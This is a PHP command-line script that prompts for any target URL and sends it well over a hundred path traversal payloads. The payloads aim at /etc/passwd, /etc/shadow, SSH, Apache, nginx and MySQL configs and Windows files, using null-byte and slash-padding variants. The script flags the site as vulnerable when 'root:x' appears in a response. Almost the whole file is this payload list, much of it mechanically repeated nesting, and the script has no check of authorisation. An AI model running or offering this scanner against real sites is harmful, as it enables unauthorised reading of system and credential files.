<?php

// Function to check if a URL is vulnerable to Path Traversal
function checkPathTraversalVulnerability($url)
{
    // Displaying what's happening in the background
    echo "\033[1;34m[*] Testing for Path Traversal vulnerability on $url ...\033[0m\n";

    // List of payloads to test for Path Traversal
    $payloads = array(
        "../etc/passwd",
        "../../../../../../etc/passwd",
        "../../../windows/win.ini",
        "../../../../../../windows/win.ini",
        "../../../boot.ini",
        "../../../../../../boot.ini",
        "../../../etc/shadow",
        "../../../../../../etc/shadow",
        "../../../../../../../../../etc/hosts",
        "../../../../../../../../../etc/resolv.conf",
        "../../../../../../../../../etc/ssh/sshd_config",
        "../../../../../../../../../etc/apache2/apache2.conf",
        "../../../../../../../../../etc/nginx/nginx.conf",
        "../../../../../../../../../etc/mysql/my.cnf",
        "../../../../../../../../../etc/hostname",
        "../../../../../../../../../etc/crontab",
        "../../../../../../../../../etc/group",
        "../../../../../../../../../etc/passwd%00",
        "../../../../../../../../../etc/passwd%2500",
        "../../../../../../../../../etc/passwd%00.jpg",
        "../../../../../../../../../etc/passwd%2500.jpg",
        "../../../../../../../../../etc/passwd/",
        "../../../../../../../../../etc/passwd//",
        "../../../../../../../../../etc/passwd///",
        "../../../../../../../../../etc/passwd////",
        "../../../../../../../../../etc/passwd%%%%",
        "../../../../../../../../../etc/passwd..%00/",
        "../../../../../../../../../etc/passwd..%00.jpg",
        "../../../../../../../../../etc/passwd%00/../",
        "../../../../../../../../../etc/passwd%00/../../",
        "../../../../../../../../../etc/passwd%00//../",
        "../../../../../../../../../etc/passwd%00////../",
        "../../../../../../../../../etc/passwd..%00//",
        "../../../../../../../../../etc/passwd..%00//../",
        "../../../../../../../../../etc/passwd%00//..//",
        "../../../../../../../../../etc/passwd%00///..//",
        "../../../../../../../../../etc/passwd..%00//..//",
        "../../../../../../../../../etc/passwd..%00///..//",
        "../../../../../../../../../etc/passwd%00//../..//",
        "../../../../../../../../../etc/passwd%00/../../..//",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%2500",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00.jpg",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%2500.jpg",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd/",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd//",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd///",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd////",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%%%%",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd..%00/",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd..%00.jpg",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00//../",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00////../",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd..%00//",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd..%00//../",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00//..//",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00///..//",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd..%00//..//",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd..%00///..//",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00//../..//",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../..//",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%2500",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00.jpg",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%2500.jpg",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd/",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd//",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd///",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd////",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%%%%",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd..%00/",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd..%00.jpg",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00//../",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00////../",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd..%00//",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd..%00//../",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00//..//",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00///..//",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd..%00//..//",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd..%00///..//",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00//../..//",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../..//",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%2500",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00.jpg",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%2500.jpg",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd/",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd//",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd///",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd////",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%%%%",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd..%00/",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd..%00.jpg",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00//../",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00////../",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd..%00//",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd..%00//../",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00//..//",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00///..//",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd..%00//..//",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd..%00///..//",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00//../..//",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../..//",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%2500",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00.jpg",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%2500.jpg",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd/",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd//",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd///",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd////",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%%%%",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd..%00/",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd..%00.jpg",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00//../",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00////../",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd..%00//",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd..%00//../",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00//..//",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00///..//",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd..%00//..//",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd..%00///..//",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00//../..//",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../..//",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%2500",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00.jpg",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%2500.jpg",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd/",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd//",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd///",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd////",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%%%%",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd..%00/",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd..%00.jpg",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00//../",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00////../",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd..%00//",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd..%00//../",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00//..//",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00///..//",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd..%00//..//",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd..%00///..//",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00//../..//",
        "../../../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../../../../../../etc/passwd%00/../../..//",
    );

    // Looping through each payload
    foreach ($payloads as $payload) {
        // Constructing the URL with the payload
        $test_url = $url . '/' . $payload;

        // Displaying what's happening in the background
        echo "\033[1;34m[*] Sending request to: $test_url\033[0m\n";

        // Sending the request and capturing the response
        $response = @file_get_contents($test_url);

        // Checking if the response contains sensitive information (e.g., /etc/passwd)
        if ($response && strpos($response, "root:x") !== false) {
            // If the response contains sensitive information, the target is vulnerable
            echo "\033[1;31m[!] The target website is vulnerable to Path Traversal!\033[0m\n";
            echo "\033[1;33m[*] How to test the vulnerability: Try accessing files outside the web root, such as ../../../etc/passwd.\033[0m\n";
            return; // Exit the function once vulnerability is found
        }
    }

    // If none of the payloads resulted in sensitive information in the response, the target is not vulnerable
    echo "\033[1;32m[+] The target website is not vulnerable to Path Traversal.\033[0m\n";
}

// Prompting the user to enter the target website URL
echo "\033[1;36mEnter your target website URL: \033[0m";
$target_url = trim(fgets(STDIN));

// Calling the function to check for Path Traversal vulnerability
checkPathTraversalVulnerability($target_url);

?>
